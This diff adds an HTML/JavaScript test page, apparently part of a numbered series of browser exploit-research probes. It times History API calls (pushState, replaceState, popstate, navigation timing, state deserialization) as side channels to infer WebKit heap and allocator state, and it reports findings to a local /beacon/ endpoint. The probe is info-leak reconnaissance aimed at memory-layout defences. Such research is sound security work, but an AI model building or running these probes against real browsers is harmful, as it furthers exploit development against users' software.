@@ -1,0 +1,338 @@
+<!--
+  p709: History API navigation state leak
+
+  The History API (pushState / replaceState) creates internal state
+  objects that are serialized via structured clone and stored in the
+  session history. The session history is managed by a C++ object
+  (BackForwardList) in WebProcess whose allocation patterns and
+  internal linked-list traversal are heap-dependent.
+
+  Attack angles:
+  A) history.length as allocation oracle -- each pushState increments
+     the history length. The exact behavior when hitting the history
+     limit reveals internal list management (LRU eviction, realloc).
+  B) Structured clone timing for state objects -- pushState serializes
+     the state via structured clone. Timing of pushState for objects
+     of different sizes and types reveals serialization internals.
+  C) replaceState timing vs pushState -- replaceState reuses the
+     current entry. If it frees the old state, the free timing
+     depends on the old state's heap location.
+  D) popstate event ordering and timing -- navigating back/forward
+     fires popstate. The event timing depends on internal list
+     traversal order.
+  E) Navigation timing entries -- performance.getEntriesByType('navigation')
+     may contain timing data that reveals internal URL object addresses.
+  F) State object identity after serialization roundtrip -- pushing
+     a state, navigating away and back, then reading history.state
+     forces deserialization. The deserialized object's identity
+     and timing reveals allocator state.
+
+  CRASH_CLASS: LOW (History API usage, no corruption)
+  prior art: p702 (structured clone), p705 (IDB timing)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p709</title>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+encodeURIComponent(m),false);x.send();}catch(e){}}
+
+function main(){
+  b('P709-START:HISTORY-NAVIGATION-LEAK');
+  var results = [];
+
+  // === SECTION A: history.length as allocation oracle ===
+  b('A:HISTORY-LENGTH-ORACLE');
+  try {
+    var initialLength = history.length;
+    b('A:INITIAL-LENGTH=' + initialLength);
+
+    // Push many states and track length behavior
+    var lengths = [];
+    var pushTimes = [];
+
+    for (var i = 0; i < 100; i++) {
+      var t0 = performance.now();
+      history.pushState({idx: i}, '', '#state' + i);
+      var dt = performance.now() - t0;
+      lengths.push(history.length);
+      pushTimes.push(dt.toFixed(4));
+    }
+
+    b('A:FINAL-LENGTH=' + history.length);
+    b('A:LENGTH-GROWTH:' + lengths.slice(0, 20).join(','));
+    b('A:PUSH-TIMES:' + pushTimes.slice(0, 20).join(','));
+
+    // Check if length caps (reveals max history size)
+    var capped = false;
+    for (var i = 1; i < lengths.length; i++) {
+      if (lengths[i] <= lengths[i-1]) {
+        b('A:LENGTH-CAPPED-AT=' + lengths[i-1] + ',AFTER=' + i + ' pushes');
+        capped = true;
+        results.push('A:history-cap=' + lengths[i-1]);
+        break;
+      }
+    }
+    if (!capped) {
+      b('A:NO-CAP-IN-100-PUSHES');
+    }
+
+    // Check push timing for steps (reallocation)
+    for (var i = 1; i < pushTimes.length; i++) {
+      var ratio = parseFloat(pushTimes[i]) / parseFloat(pushTimes[i-1]);
+      if (ratio > 3 && parseFloat(pushTimes[i]) > 0.1) {
+        b('A:PUSH-STEP-AT=' + i + ',RATIO=' + ratio.toFixed(2));
+        results.push('A:push-step=' + i);
+        break;
+      }
+    }
+
+    // Clean up -- go back to original state
+    history.go(-100);
+  } catch(e) {
+    b('A:ERR:' + e.message);
+  }
+
+  // === SECTION B: pushState structured clone timing ===
+  b('B:PUSHSTATE-CLONE-TIMING');
+  try {
+    var stateObjects = [
+      {name: 'null', state: null},
+      {name: 'int', state: 42},
+      {name: 'string', state: 'hello world'},
+      {name: 'small-obj', state: {a: 1, b: 2, c: 3}},
+      {name: 'array-100', state: Array.from({length: 100}, function(_, i) { return i; })},
+      {name: 'nested', state: {a: {b: {c: {d: {e: 1}}}}}},
+      {name: 'big-string', state: 'x'.repeat(10000)},
+      {name: 'typed-array', state: {data: Array.from(new Uint8Array(1024))}},
+      {name: 'date', state: {d: new Date().toISOString()}},
+      {name: 'mixed', state: {n: 42, s: 'test', a: [1,2,3], o: {x: true}}},
+    ];
+
+    var cloneTimes = [];
+    for (var s = 0; s < stateObjects.length; s++) {
+      var t0 = performance.now();
+      for (var i = 0; i < 500; i++) {
+        history.replaceState(stateObjects[s].state, '');
+      }
+      var dt = performance.now() - t0;
+      cloneTimes.push(stateObjects[s].name + ':' + dt.toFixed(2));
+    }
+    b('B:CLONE-TIMES:' + cloneTimes.join(','));
+
+    // Check which types are slowest (reveals serialization format)
+    var times = cloneTimes.map(function(t) { return parseFloat(t.split(':')[1]); });
+    var maxIdx = 0;
+    for (var i = 1; i < times.length; i++) {
+      if (times[i] > times[maxIdx]) maxIdx = i;
+    }
+    b('B:SLOWEST=' + stateObjects[maxIdx].name + ',TIME=' + times[maxIdx].toFixed(2));
+  } catch(e) {
+    b('B:ERR:' + e.message);
+  }
+
+  // === SECTION C: replaceState vs pushState timing ===
+  b('C:REPLACE-VS-PUSH');
+  try {
+    // Pre-fill a state
+    history.replaceState({big: 'x'.repeat(5000)}, '');
+
+    // Time replaceState (frees old, allocates new)
+    var replaceTimes = [];
+    for (var round = 0; round < 20; round++) {
+      var newState = {round: round, data: 'y'.repeat(5000)};
+      var t0 = performance.now();
+      history.replaceState(newState, '');
+      var dt = performance.now() - t0;
+      replaceTimes.push(dt.toFixed(4));
+    }
+    b('C:REPLACE-TIMES:' + replaceTimes.join(','));
+
+    // Time pushState (allocates new, no free)
+    var pushTimesC = [];
+    for (var round = 0; round < 20; round++) {
+      var newState = {round: round, data: 'z'.repeat(5000)};
+      var t0 = performance.now();
+      history.pushState(newState, '', '#cmp' + round);
+      var dt = performance.now() - t0;
+      pushTimesC.push(dt.toFixed(4));
+    }
+    b('C:PUSH-TIMES:' + pushTimesC.join(','));
+
+    // Compare averages
+    var avgReplace = replaceTimes.reduce(function(a,b){return a+parseFloat(b)},0) / replaceTimes.length;
+    var avgPush = pushTimesC.reduce(function(a,b){return a+parseFloat(b)},0) / pushTimesC.length;
+    b('C:AVG-REPLACE=' + avgReplace.toFixed(4) + ',AVG-PUSH=' + avgPush.toFixed(4));
+
+    if (avgReplace > avgPush * 1.5) {
+      b('C:REPLACE-SLOWER-FREE-OVERHEAD');
+      results.push('C:replace-free-overhead');
+    }
+  } catch(e) {
+    b('C:ERR:' + e.message);
+  }
+
+  // === SECTION D: popstate event timing ===
+  b('D:POPSTATE-TIMING');
+  try {
+    var popEvents = [];
+    var popHandler = function(e) {
+      popEvents.push({
+        time: performance.now(),
+        state: e.state,
+      });
+    };
+    window.addEventListener('popstate', popHandler);
+
+    // Push known states
+    for (var i = 0; i < 10; i++) {
+      history.pushState({seq: i, marker: 'poptest'}, '', '#pop' + i);
+    }
+
+    // Navigate back and record popstate timing
+    // Note: history.back() is async -- popstate fires asynchronously
+    for (var i = 0; i < 5; i++) {
+      history.back();
+    }
+
+    // Pump to receive popstate events
+    var deadline = Date.now() + 500;
+    while (Date.now() < deadline && popEvents.length < 5) {
+      try { var x = new XMLHttpRequest(); x.open('GET','/pump-pop',false); x.send(); } catch(e2){}
+    }
+
+    b('D:POP-EVENTS=' + popEvents.length);
+    for (var i = 0; i < Math.min(popEvents.length, 5); i++) {
+      var stateStr = popEvents[i].state ? JSON.stringify(popEvents[i].state) : 'null';
+      b('D:POP' + i + ':t=' + popEvents[i].time.toFixed(4) + ',state=' + stateStr.substring(0, 50));
+    }
+
+    // Check inter-event timing
+    if (popEvents.length >= 2) {
+      var deltas = [];
+      for (var i = 1; i < popEvents.length; i++) {
+        deltas.push((popEvents[i].time - popEvents[i-1].time).toFixed(4));
+      }
+      b('D:POP-DELTAS:' + deltas.join(','));
+    }
+
+    window.removeEventListener('popstate', popHandler);
+  } catch(e) {
+    b('D:ERR:' + e.message);
+  }
+
+  // === SECTION E: Navigation timing entries ===
+  b('E:NAV-TIMING-ENTRIES');
+  try {
+    // Check performance.getEntriesByType
+    var navEntries = performance.getEntriesByType('navigation');
+    b('E:NAV-ENTRIES=' + navEntries.length);
+
+    if (navEntries.length > 0) {
+      var nav = navEntries[0];
+      var props = Object.getOwnPropertyNames(Object.getPrototypeOf(nav));
+      b('E:NAV-PROPS:' + props.join(','));
+
+      // Dump all numeric properties
+      var numericVals = [];
+      for (var i = 0; i < props.length; i++) {
+        try {
+          var v = nav[props[i]];
+          if (typeof v === 'number') {
+            numericVals.push(props[i] + '=' + v);
+            // Check for pointer-like values
+            if (v > 0x100000000) {
+              b('E:LARGE-VAL:' + props[i] + '=' + v);
+              results.push('E:nav-large-val=' + props[i]);
+            }
+          }
+        } catch(e2) {}
+      }
+      b('E:NUMERIC:' + numericVals.slice(0, 10).join(','));
+      if (numericVals.length > 10) {
+        b('E:NUMERIC2:' + numericVals.slice(10, 20).join(','));
+      }
+    }
+
+    // Also check resource timing
+    var resEntries = performance.getEntriesByType('resource');
+    b('E:RES-ENTRIES=' + resEntries.length);
+    for (var i = 0; i < Math.min(resEntries.length, 3); i++) {
+      b('E:RES' + i + ':' + resEntries[i].name.substring(0, 60) +
+        ',dur=' + resEntries[i].duration.toFixed(2));
+    }
+  } catch(e) {
+    b('E:ERR:' + e.message);
+  }
+
+  // === SECTION F: State deserialization roundtrip ===
+  b('F:STATE-ROUNDTRIP');
+  try {
+    // Push state objects of different types
+    var testStates = [
+      {type: 'small', val: {a: 1}},
+      {type: 'medium', val: {data: 'x'.repeat(1000)}},
+      {type: 'large', val: {data: 'y'.repeat(10000)}},
+      {type: 'nested', val: {a: {b: {c: {d: {e: {f: 42}}}}}}},
+      {type: 'array', val: {arr: Array.from({length: 500}, function(_, i) { return i * i; })}},
+    ];
+
+    // Push all states
+    for (var s = 0; s < testStates.length; s++) {
+      history.pushState(testStates[s].val, '', '#rt' + s);
+    }
+
+    // Read back state immediately (no navigation needed)
+    var readTimes = [];
+    for (var round = 0; round < 10; round++) {
+      var t0 = performance.now();
+      for (var i = 0; i < 1000; i++) {
+        var st = history.state;
+      }
+      var dt = performance.now() - t0;
+      readTimes.push(dt.toFixed(3));
+    }
+    b('F:READ-TIMES:' + readTimes.join(','));
+
+    // Check if state is the same object each time (cached) or new (deserialized)
+    var st1 = history.state;
+    var st2 = history.state;
+    b('F:SAME-REF=' + (st1 === st2));
+    if (st1 !== st2) {
+      b('F:DESERIALIZED-EACH-READ');
+      results.push('F:state-deserialize-each');
+    }
+
+    // Check that state survived roundtrip
+    if (st1 && typeof st1 === 'object') {
+      b('F:STATE-KEYS=' + Object.keys(st1).join(','));
+    }
+
+    // Measure deserialization timing for different state sizes
+    var deserTimes = [];
+    for (var s = testStates.length - 1; s >= 0; s--) {
+      history.back();
+      // Pump
+      try { var x = new XMLHttpRequest(); x.open('GET','/pump-deser',false); x.send(); } catch(e2){}
+
+      var t0 = performance.now();
+      for (var i = 0; i < 1000; i++) {
+        var st = history.state;
+      }
+      var dt = performance.now() - t0;
+      deserTimes.push(testStates[s].type + ':' + dt.toFixed(3));
+    }
+    b('F:DESER-TIMES:' + deserTimes.join(','));
+  } catch(e) {
+    b('F:ERR:' + e.message);
+  }
+
+  // === RESULTS ===
+  if (results.length > 0) {
+    b('P709-RESULT:HITS=' + results.join(';'));
+  } else {
+    b('P709-RESULT:NO-LEAK-DETECTED');
+  }
+  b('P709-DONE');
+}
+
+setTimeout(main, 200);
+</script>
+</head><body style="margin:0"><pre id="log">p709: History API navigation state leak</pre></body></html>
